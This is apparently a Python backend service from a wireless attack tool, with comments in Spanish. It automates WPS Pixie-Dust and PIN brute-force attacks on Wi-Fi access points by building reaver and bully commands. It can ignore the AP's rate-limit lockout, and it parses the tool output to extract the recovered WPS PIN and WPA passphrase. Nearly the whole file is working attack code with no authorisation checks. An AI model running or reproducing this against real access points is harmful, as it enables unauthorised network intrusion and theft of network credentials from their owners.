"""
WPS Attack Service — Pixie-Dust y fuerza bruta de PIN contra APs con WPS.

WPS (Wi-Fi Protected Setup) permite unirse a la red con un PIN de 8 dígitos.
Dos vectores:
  - Pixie-Dust (offline): explota la generación débil de nonces (E-S1/E-S2) de
    muchos chipsets. Recupera el PIN en segundos/minutos cuando es vulnerable.
    Herramientas: reaver -K 1  /  bully -d (pixiewps).
  - Fuerza bruta de PIN (online): prueba los ~11.000 PIN válidos contra el AP.
    Lento (horas) y a menudo limitado por el lockout del AP. Herramienta: reaver.

Al encontrar el PIN, reaver/bully recuperan también la PSK WPA.
Herramientas por detrás: reaver, bully, pixiewps.
"""

import re
import uuid
import asyncio
import shutil
import logging
from datetime import datetime

from app.utils.process_manager import process_manager

logger = logging.getLogger(__name__)

# ── Parseo de la salida de reaver / bully ──
# El PIN "encontrado" solo se anuncia como "WPS PIN: '...'" (reaver) o
# "Pin is '...'" (bully) — NO en las líneas "Trying pin ..." (eso es _RE_TRY).
_RE_PIN = re.compile(r"(?:WPS PIN|Pin is)\s*[:=]?\s*['\"]?(\d{4,8})['\"]?", re.I)
_RE_PSK = re.compile(r"(?:WPA PSK|key is)\s*[:=]?\s*['\"]([^'\"]+)['\"]", re.I)
_RE_LOCK = re.compile(r"(rate.?limit|lock(?:ed|out)?|throttl|WPSFAIL)", re.I)
_RE_TRY = re.compile(r"[Tt]ry(?:ing)?\s+pin[:\s]*['\"]?(\d+)", re.I)
_RE_PCT = re.compile(r"(\d{1,3}\.\d{1,2})%")


class WpsService:
    def __init__(self):
        self._active: dict | None = None
        self._proc_id: str | None = None
        self._bg: set = set()

    async def start(self, req) -> dict:
        if self._active and self._active.get("status") == "running":
            return {"started": False, "error": "Ya hay un ataque WPS en curso. Deténlo primero."}

        tool = (getattr(req, "tool", None) or "reaver").lower()
        if tool not in ("reaver", "bully"):
            tool = "reaver"
        if not shutil.which(tool):
            return {"started": False, "error": f"{tool} no está instalado (sudo apt install {tool})"}

        attack_id = str(uuid.uuid4())[:8]
        proc_id = str(uuid.uuid4())[:8]
        cmd = self._build_cmd(req, tool)

        self._active = {
            "attack_id": attack_id,
            "status": "running",
            "tool": tool,
            "attack_type": req.attack_type,
            "target_bssid": req.target_bssid,
            "target_essid": getattr(req, "target_essid", None),
            "interface": req.interface,
            "channel": getattr(req, "channel", None),
            "command": " ".join(cmd),
            "started_at": datetime.now().isoformat(),
            "finished_at": None,
            "pin": None,
            "psk": None,
            "locked": False,
            "progress": None,
            "attempts": 0,
            "last_pin": None,
            "log": [],
        }
        self._proc_id = proc_id

        t = asyncio.create_task(self._run(cmd, proc_id))
        self._bg.add(t)
        t.add_done_callback(self._bg.discard)
        return {"started": True, "attack_id": attack_id, "tool": tool, "command": " ".join(cmd)}

    def _build_cmd(self, req, tool: str) -> list:
        iface = req.interface
        bssid = req.target_bssid
        ch = getattr(req, "channel", None)
        atype = (req.attack_type or "pixie").lower()
        pin = getattr(req, "pin", None)

        if tool == "bully":
            cmd = ["bully", iface, "-b", bssid, "-v", "3"]
            if ch:
                cmd += ["-c", str(ch)]
            if atype == "pixie":
                cmd += ["-d"]           # pixiewps (Pixie-Dust)
            if pin:
                cmd += ["-p", str(pin)]
            return cmd

        # reaver (por defecto)
        cmd = ["reaver", "-i", iface, "-b", bssid, "-vv", "-N"]
        if ch:
            cmd += ["-c", str(ch)]
        if atype == "pixie":
            cmd += ["-K", "1"]          # Pixie-Dust
        if getattr(req, "no_lock", False):
            cmd += ["-L"]               # ignora el lockout del AP
        if getattr(req, "delay", None) is not None:
            cmd += ["-d", str(req.delay)]
        if pin:
            cmd += ["-p", str(pin)]
        return cmd

    async def _run(self, cmd: list, proc_id: str):
        st = self._active

        async def on_line(line: str):
            self._parse_line(line)

        try:
            # Pixie-Dust es rápido; la fuerza bruta puede durar horas.
            timeout = 900 if st["attack_type"] == "pixie" else 10800
            managed = await process_manager.run(
                cmd, timeout=timeout, proc_id=proc_id, on_stdout=on_line
            )
            for line in managed.stderr_lines[-80:]:
                self._parse_line(line)
            if st["status"] == "running":
                if st.get("pin") or st.get("psk"):
                    st["status"] = "success"
                elif managed.return_code == 0:
                    st["status"] = "completed"
                else:
                    st["status"] = "failed"
        except Exception as e:
            logger.error(f"WPS attack error: {e}")
            st["status"] = "failed"
            st["error"] = str(e)
        finally:
            st["finished_at"] = datetime.now().isoformat()

    def _parse_line(self, line: str):
        st = self._active
        if not st or not line:
            return
        st["log"].append(line)
        if len(st["log"]) > 400:
            st["log"] = st["log"][-400:]

        m = _RE_PIN.search(line)
        if m:
            st["pin"] = m.group(1)
        m = _RE_PSK.search(line)
        if m:
            st["psk"] = m.group(1).strip()
        if _RE_LOCK.search(line):
            st["locked"] = True
        m = _RE_TRY.search(line)
        if m:
            st["last_pin"] = m.group(1)
            st["attempts"] += 1
        m = _RE_PCT.search(line)
        if m:
            try:
                st["progress"] = float(m.group(1))
            except ValueError:
                pass

    def status(self) -> dict:
        if not self._active:
            return {"active": False}
        st = dict(self._active)
        st["active"] = st.get("status") == "running"
        st["log"] = st.get("log", [])[-40:]
        return st

    async def stop(self) -> dict:
        if self._proc_id:
            await process_manager.cancel(self._proc_id)
        if self._active and self._active.get("status") == "running":
            self._active["status"] = "cancelled"
            self._active["finished_at"] = datetime.now().isoformat()
        return {"stopped": True}


wps_service = WpsService()
